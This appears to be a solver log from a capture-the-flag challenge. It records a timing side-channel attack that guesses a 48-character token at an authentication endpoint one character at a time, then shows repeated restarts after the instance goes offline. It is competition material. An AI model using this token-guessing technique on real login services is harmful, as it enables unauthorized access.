+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[pulse] health=200 97ms
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[screen 62/62] cand='Z'
+[guard] re-probe 'Y' (1/2)
+[guard] re-probe 'Y' (2/2)
+  [artifact] excluded 'Y': phase-1 z=327.30; re-probe z=-50.23,-41.87
+[guard] re-probe 'p' (1/2)
+[guard] re-probe 'p' (2/2)
+  [artifact] excluded 'p': phase-1 z=15.93; re-probe z=-32.55,-27.14
+[sprt] cand='N' llr=-725.06 n=1
+[sprt] cand='2' llr=-630.27 n=1
+[deep] 1/30 cand='Y'
+[deep] 2/30 cand='p'
+[deep] 3/30 cand='N'
+[deep] 4/30 cand='Y'
+[deep] 5/30 cand='p'
+[deep] 6/30 cand='N'
+[deep] 7/30 cand='Y'
+[deep] 8/30 cand='p'
+[deep] 9/30 cand='N'
+[deep] 10/30 cand='Y'
+[deep] 11/30 cand='p'
+[deep] 12/30 cand='N'
+[deep] 13/30 cand='Y'
+[deep] 14/30 cand='p'
+[deep] 15/30 cand='N'
+[pulse] health=200 93ms
+[deep] 16/30 cand='Y'
+[deep] 17/30 cand='p'
+[deep] 18/30 cand='N'
+[deep] 19/30 cand='Y'
+[deep] 20/30 cand='p'
+[deep] 21/30 cand='N'
+[deep] 22/30 cand='Y'
+[deep] 23/30 cand='p'
+[deep] 24/30 cand='N'
+[deep] 25/30 cand='Y'
+[deep] 26/30 cand='p'
+[deep] 27/30 cand='N'
+[deep] 28/30 cand='Y'
+[deep] 29/30 cand='p'
+[deep] 30/30 cand='N'
+[watch 08:23] no signal best_z=-7.68 baseline=-0.48ms
+[screen 1/62] cand='0'
+[pulse] health=200 103ms
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[pulse] health=200 90ms
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[pulse] health=200 181ms
+[screen 62/62] cand='Z'
+[guard] re-probe 'O' (1/2)
+[guard] re-probe 'O' (2/2)
+  [artifact] excluded 'O': phase-1 z=9.02; re-probe z=-0.25,0.52
+[sprt] cand='G' llr=-141.12 n=1
+[sprt] cand='J' llr=-136.46 n=1
+[deep] 1/30 cand='O'
+[deep] 2/30 cand='G'
+[deep] 3/30 cand='J'
+[deep] 4/30 cand='O'
+[deep] 5/30 cand='G'
+[deep] 6/30 cand='J'
+[deep] 7/30 cand='O'
+[deep] 8/30 cand='G'
+[deep] 9/30 cand='J'
+[deep] 10/30 cand='O'
+[deep] 11/30 cand='G'
+[deep] 12/30 cand='J'
+[supervisor 1 2026-08-24 08:32:56] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='x'
+[screen 2/62] cand='n'
+[screen 3/62] cand='b'
+[screen 4/62] cand='4'
+[screen 5/62] cand='f'
+[screen 6/62] cand='K'
+[screen 7/62] cand='8'
+[screen 8/62] cand='m'
+[screen 9/62] cand='I'
+[screen 10/62] cand='P'
+[screen 11/62] cand='T'
+[screen 12/62] cand='R'
+[anchor 1] cand='q'
+[screen 13/62] cand='U'
+[screen 14/62] cand='r'
+[screen 15/62] cand='3'
+[screen 16/62] cand='t'
+[screen 17/62] cand='g'
+[screen 18/62] cand='w'
+[screen 19/62] cand='6'
+[screen 20/62] cand='M'
+[screen 21/62] cand='V'
+[screen 22/62] cand='c'
+[screen 23/62] cand='D'
+[screen 24/62] cand='7'
+[anchor 2] cand='q'
+[screen 25/62] cand='W'
+[screen 26/62] cand='N'
+[screen 27/62] cand='v'
+[screen 28/62] cand='X'
+[screen 29/62] cand='z'
+[pulse] health=200 108ms
+[screen 30/62] cand='l'
+[screen 31/62] cand='Q'
+[screen 32/62] cand='u'
+[screen 33/62] cand='o'
+[screen 34/62] cand='a'
+[screen 35/62] cand='h'
+[screen 36/62] cand='E'
+[anchor 3] cand='q'
+[screen 37/62] cand='p'
+[screen 38/62] cand='i'
+[screen 39/62] cand='F'
+[screen 40/62] cand='k'
+[screen 41/62] cand='L'
+[screen 42/62] cand='q'
+[screen 43/62] cand='1'
+[screen 44/62] cand='A'
+[screen 45/62] cand='2'
+[screen 46/62] cand='J'
+[screen 47/62] cand='y'
+[screen 48/62] cand='5'
+[anchor 4] cand='q'
+[screen 49/62] cand='s'
+[screen 50/62] cand='S'
+[screen 51/62] cand='G'
+[screen 52/62] cand='e'
+[screen 53/62] cand='O'
+[screen 54/62] cand='C'
+[screen 55/62] cand='Z'
+[screen 56/62] cand='H'
+[screen 57/62] cand='9'
+[pulse] health=200 97ms
+[screen 58/62] cand='Y'
+[screen 59/62] cand='j'
+[screen 60/62] cand='B'
+[anchor 5] cand='q'
+[screen 61/62] cand='0'
+[screen 62/62] cand='d'
+[screen 1/62] cand='z'
+[screen 2/62] cand='8'
+[screen 3/62] cand='3'
+[screen 4/62] cand='n'
+[screen 5/62] cand='9'
+[screen 6/62] cand='y'
+[screen 7/62] cand='P'
+[screen 8/62] cand='A'
+[screen 9/62] cand='L'
+[screen 10/62] cand='U'
+[screen 11/62] cand='I'
+[screen 12/62] cand='Z'
+[anchor 1] cand='q'
+[screen 13/62] cand='V'
+[screen 14/62] cand='F'
+[screen 15/62] cand='k'
+[screen 16/62] cand='l'
+[screen 17/62] cand='T'
+[screen 18/62] cand='Q'
+[screen 19/62] cand='4'
+[screen 20/62] cand='W'
+[screen 21/62] cand='G'
+[screen 22/62] cand='j'
+[screen 23/62] cand='J'
+[pulse] health=200 101ms
+[screen 24/62] cand='D'
+[anchor 2] cand='q'
+[screen 25/62] cand='h'
+[screen 26/62] cand='d'
+[screen 27/62] cand='a'
+[screen 28/62] cand='6'
+[screen 29/62] cand='X'
+[screen 30/62] cand='f'
+[screen 31/62] cand='R'
+[screen 32/62] cand='2'
+[screen 33/62] cand='m'
+[screen 34/62] cand='s'
+[screen 35/62] cand='S'
+[screen 36/62] cand='Y'
+[anchor 3] cand='q'
+[screen 37/62] cand='1'
+[screen 38/62] cand='u'
+[screen 39/62] cand='7'
+[screen 40/62] cand='H'
+[screen 41/62] cand='C'
+[screen 42/62] cand='x'
+[screen 43/62] cand='t'
+[screen 44/62] cand='b'
+[screen 45/62] cand='N'
+[screen 46/62] cand='E'
+[screen 47/62] cand='O'
+[screen 48/62] cand='e'
+[anchor 4] cand='q'
+[screen 49/62] cand='c'
+[screen 50/62] cand='q'
+[pulse] health=200 96ms
+[screen 51/62] cand='g'
+[screen 52/62] cand='i'
+[screen 53/62] cand='r'
+[screen 54/62] cand='5'
+[screen 55/62] cand='M'
+[screen 56/62] cand='w'
+[screen 57/62] cand='0'
+[screen 58/62] cand='o'
+[screen 59/62] cand='K'
+[screen 60/62] cand='p'
+[anchor 5] cand='q'
+[screen 61/62] cand='v'
+[screen 62/62] cand='B'
+  [!] No relative winner: best=70.54z; re-running the full screen once...
+[screen 1/62] cand='7'
+[screen 2/62] cand='c'
+[screen 3/62] cand='h'
+[screen 4/62] cand='U'
+[screen 5/62] cand='v'
+[screen 6/62] cand='S'
+[screen 7/62] cand='Y'
+[screen 8/62] cand='W'
+[screen 9/62] cand='L'
+[screen 10/62] cand='C'
+[screen 11/62] cand='B'
+[screen 12/62] cand='p'
+[anchor 1] cand='q'
+[screen 13/62] cand='k'
+[screen 14/62] cand='F'
+[screen 15/62] cand='K'
+[screen 16/62] cand='n'
+[pulse] health=200 91ms
+[screen 17/62] cand='O'
+[screen 18/62] cand='E'
+[screen 19/62] cand='5'
+[screen 20/62] cand='8'
+[screen 21/62] cand='M'
+[screen 22/62] cand='P'
+[screen 23/62] cand='V'
+[screen 24/62] cand='i'
+[anchor 2] cand='q'
+[screen 25/62] cand='4'
+[screen 26/62] cand='H'
+[screen 27/62] cand='u'
+[screen 28/62] cand='o'
+[screen 29/62] cand='J'
+[screen 30/62] cand='T'
+[screen 31/62] cand='y'
+[screen 32/62] cand='x'
+[screen 33/62] cand='w'
+[screen 34/62] cand='9'
+[screen 35/62] cand='Z'
+[screen 36/62] cand='b'
+[anchor 3] cand='q'
+[screen 37/62] cand='f'
+[screen 38/62] cand='X'
+[screen 39/62] cand='m'
+[screen 40/62] cand='s'
+[screen 41/62] cand='A'
+[screen 42/62] cand='e'
+[screen 43/62] cand='r'
+[screen 44/62] cand='D'
+[pulse] health=200 98ms
+[screen 45/62] cand='d'
+[screen 46/62] cand='N'
+[screen 47/62] cand='t'
+[screen 48/62] cand='g'
+[anchor 4] cand='q'
+[screen 49/62] cand='3'
+[screen 50/62] cand='q'
+[screen 51/62] cand='1'
+[screen 52/62] cand='a'
+[screen 53/62] cand='6'
+[screen 54/62] cand='R'
+[screen 55/62] cand='Q'
+[screen 56/62] cand='z'
+[screen 57/62] cand='l'
+[screen 58/62] cand='0'
+[screen 59/62] cand='G'
+[screen 60/62] cand='I'
+[anchor 5] cand='q'
+[screen 61/62] cand='2'
+[screen 62/62] cand='j'
+[screen 1/62] cand='4'
+[screen 2/62] cand='Y'
+[screen 3/62] cand='d'
+[screen 4/62] cand='e'
+[screen 5/62] cand='6'
+[screen 6/62] cand='3'
+[screen 7/62] cand='z'
+[screen 8/62] cand='a'
+[screen 9/62] cand='K'
+[screen 10/62] cand='A'
+[pulse] health=200 109ms
+[screen 11/62] cand='i'
+[screen 12/62] cand='t'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 1 2026-08-24 08:43:57] solver exited code=3
+[supervisor 2 2026-08-24 08:44:42] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='G'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 2 2026-08-24 08:44:46] solver exited code=3
+[supervisor 1 2026-08-24 08:45:03] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='r'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 1 2026-08-24 08:45:07] solver exited code=3
+[supervisor 2 2026-08-24 08:45:52] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='6'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 2 2026-08-24 08:45:56] solver exited code=3
+[supervisor 3 2026-08-24 08:46:41] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='a'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 3 2026-08-24 08:46:45] solver exited code=3
+[supervisor 4 2026-08-24 08:47:30] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='I'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 4 2026-08-24 08:47:35] solver exited code=3
+[supervisor 5 2026-08-24 08:48:20] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='g'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 5 2026-08-24 08:48:24] solver exited code=3
+[supervisor 6 2026-08-24 08:49:09] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='A'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 6 2026-08-24 08:49:13] solver exited code=3
+[supervisor 7 2026-08-24 08:49:58] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='3'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 7 2026-08-24 08:50:02] solver exited code=3
+[supervisor 8 2026-08-24 08:50:47] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='5'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 8 2026-08-24 08:50:51] solver exited code=3
+[supervisor 9 2026-08-24 08:51:36] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='v'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 9 2026-08-24 08:51:40] solver exited code=3
+[supervisor 10 2026-08-24 08:52:25] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='H'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 10 2026-08-24 08:52:29] solver exited code=3
+[supervisor 11 2026-08-24 08:53:14] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='2'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 11 2026-08-24 08:53:19] solver exited code=3
+[supervisor 12 2026-08-24 08:54:04] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='I'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 12 2026-08-24 08:54:09] solver exited code=3
+[supervisor 13 2026-08-24 08:54:54] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='x'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 13 2026-08-24 08:54:58] solver exited code=3
+[supervisor 14 2026-08-24 08:55:43] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='K'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 14 2026-08-24 08:55:47] solver exited code=3
+[supervisor 15 2026-08-24 08:56:32] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='C'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 15 2026-08-24 08:56:36] solver exited code=3
+[supervisor 16 2026-08-24 08:57:21] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='g'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 16 2026-08-24 08:57:25] solver exited code=3
+[supervisor 17 2026-08-24 08:58:10] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='n'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 17 2026-08-24 08:58:14] solver exited code=3
+[supervisor 18 2026-08-24 08:58:59] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='j'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 18 2026-08-24 08:59:03] solver exited code=3
+[supervisor 19 2026-08-24 08:59:48] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='Q'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 19 2026-08-24 08:59:52] solver exited code=3
+[supervisor 1 2026-08-24 09:00:03] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='4'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 1 2026-08-24 09:00:07] solver exited code=3
+[supervisor 2 2026-08-24 09:00:52] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 2 2026-08-24 09:00:56] solver exited code=3
+[supervisor 3 2026-08-24 09:01:41] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 3.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='p'
+
+[!] INSTANCE OFFLINE: /api/authenticate and /health both returned 404; restart the challenge instance.
+[supervisor 3 2026-08-24 09:01:45] solver exited code=3
